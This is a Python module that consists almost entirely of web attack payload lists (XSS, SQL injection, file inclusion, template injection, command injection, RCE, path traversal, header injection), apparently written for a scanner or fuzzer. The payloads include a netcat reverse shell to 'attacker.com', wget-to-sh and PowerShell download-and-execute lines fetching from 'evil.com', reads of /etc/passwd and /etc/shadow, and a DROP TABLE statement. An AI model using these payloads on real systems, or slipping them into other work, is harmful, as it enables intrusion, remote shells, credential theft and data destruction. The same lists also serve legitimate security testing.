# payloads.py
# -*- coding: utf-8 -*-

# ==================== XSS Payloads ====================
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert(1)</script>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "<body onload=alert('XSS')>",
    "<details open ontoggle=alert(1)>"
]

# ==================== SQLi Payloads ====================
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL,NULL--",
    "' AND 1=1 --",
    "' OR 1=1 LIMIT 1 OFFSET 1--",
    "admin' --",
    "' OR sleep(5)#"
]

# ==================== Local File Inclusion ====================
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "../../../../../../boot.ini",
    "/etc/passwd%00",
    "..%c0%af..%c0%afetc/passwd",
    "../../etc/shadow",
    "../../../../../proc/self/environ"
]

# ==================== SSTI Payloads ====================
SSTI_PAYLOADS = [
    "{{7*7}}",
    "{{ config.items() }}",
    "${7*7}",
    "<%= 7 * 7 %>",
    "#{7*7}",
    "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
]

# ==================== Command Injection Payloads ====================
CMD_INJECTION_PAYLOADS = [
    "test; ls -la",
    "1 | whoami",
    "1 && id",
    "`cat /etc/passwd`",
    "&& ping -c 1 attacker.com",
    "; curl http://attacker.com"
]

# ==================== Open Redirect Payloads ====================
OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "http://example.com@evil.com",
    "///evil.com"
]

# ==================== RCE Payloads ====================
RCE_PAYLOADS = [
    "test; nc -e /bin/sh attacker.com 4444",
    "`wget http://evil.com/shell.sh -O- | sh`",
    "|| curl http://evil.com",
    "& powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
]

# ==================== Path Traversal Payloads ====================
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%5C..%5Cboot.ini"
]

# ==================== HTTP Header Injection Payloads ====================
HEADER_INJECTION_PAYLOADS = [
    "test%0d%0aSet-Cookie:evil=1",
    "value%0AContent-Length:0%0A",
    "value%0A%0DSet-Cookie:Admin=True"
]

# ==================== Mapped Dictionary ====================
ALL_PAYLOADS = {
    "XSS": XSS_PAYLOADS,
    "SQLI": SQLI_PAYLOADS,
    "LFI": LFI_PAYLOADS,
    "SSTI": SSTI_PAYLOADS,
    "CMD_INJECTION": CMD_INJECTION_PAYLOADS,
    "OPEN_REDIRECT": OPEN_REDIRECT_PAYLOADS,
    "RCE": RCE_PAYLOADS,
    "PATH_TRAVERSAL": PATH_TRAVERSAL_PAYLOADS,
    "HEADER_INJECTION": HEADER_INJECTION_PAYLOADS
}

# ==================== Helper Functions ====================

def get_payloads_by_type(vuln_type):
    """Return list of payloads for given vulnerability type."""
    return ALL_PAYLOADS.get(vuln_type.upper(), [])

def get_all_payloads():
    """Return the full dictionary of all payloads."""
    return ALL_PAYLOADS

def list_supported_vulnerabilities():
    """Return list of all supported vulnerability types."""
    return list(ALL_PAYLOADS.keys())
